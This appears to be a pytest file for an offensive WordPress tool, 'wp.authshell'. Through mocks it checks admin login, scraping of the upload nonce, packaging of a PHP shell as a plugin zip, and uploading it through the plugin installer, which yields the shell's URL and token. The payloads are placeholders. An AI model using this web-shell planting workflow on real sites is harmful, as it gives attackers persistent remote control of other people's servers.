import io
import zipfile
from unittest.mock import MagicMock
from wp import authshell as wp_authshell


def _http_with_cookies(names):
    http = MagicMock()
    http.session.cookies.keys.return_value = names
    return http


def test_login_true_when_logged_in_cookie_set():
    http = _http_with_cookies(["wordpress_test_cookie", "wordpress_logged_in_abc"])
    assert wp_authshell.login("https://t", http, "admin", "pw") is True

def test_login_false_without_logged_in_cookie():
    http = _http_with_cookies(["wordpress_test_cookie"])   # bad password → no logged_in
    assert wp_authshell.login("https://t", http, "admin", "wrong") is False

def test_login_false_on_transport_error():
    http = MagicMock(); http.get.side_effect = Exception("down")
    assert wp_authshell.login("https://t", http, "admin", "pw") is False


def test_build_plugin_zip_has_header_and_shell():
    data = wp_authshell._build_plugin_zip("myplug", "shell.php", "<?php echo 1; ?>")
    z = zipfile.ZipFile(io.BytesIO(data))
    names = z.namelist()
    assert "myplug/myplug.php" in names            # header file so WP accepts it
    assert "myplug/shell.php" in names
    assert "Plugin Name:" in z.read("myplug/myplug.php").decode()
    assert z.read("myplug/shell.php").decode() == "<?php echo 1; ?>"


def test_upload_nonce_extracted():
    http = MagicMock()
    http.get.return_value = MagicMock(
        text='<input type="hidden" id="_wpnonce" name="_wpnonce" value="deadbeef01" />')
    assert wp_authshell._upload_nonce(http, "https://t") == "deadbeef01"

def test_upload_nonce_missing_returns_none():
    http = MagicMock(); http.get.return_value = MagicMock(text="<html>no nonce</html>")
    assert wp_authshell._upload_nonce(http, "https://t") is None


def test_plant_builds_shell_url_and_uploads():
    http = MagicMock()
    http.get.return_value = MagicMock(text='name="_wpnonce" value="n0nce"')
    http.post.return_value = MagicMock(status_code=200)
    out = wp_authshell.plant_plugin_shell(
        "https://t/", http, payload=("wsh_dead.php", "<?php ?>", "dead"), slug="sys_x")
    assert out["url"] == "https://t/wp-content/plugins/sys_x/wsh_dead.php"
    assert out["token"] == "dead"
    # uploaded via update.php with the nonce + a plugin zip
    args, kwargs = http.post.call_args
    assert "action=upload-plugin" in args[0]
    assert kwargs["data"]["_wpnonce"] == "n0nce"
    assert "pluginzip" in kwargs["files"]

def test_plant_none_without_nonce():
    http = MagicMock(); http.get.return_value = MagicMock(text="no nonce here")
    assert wp_authshell.plant_plugin_shell("https://t", http) is None
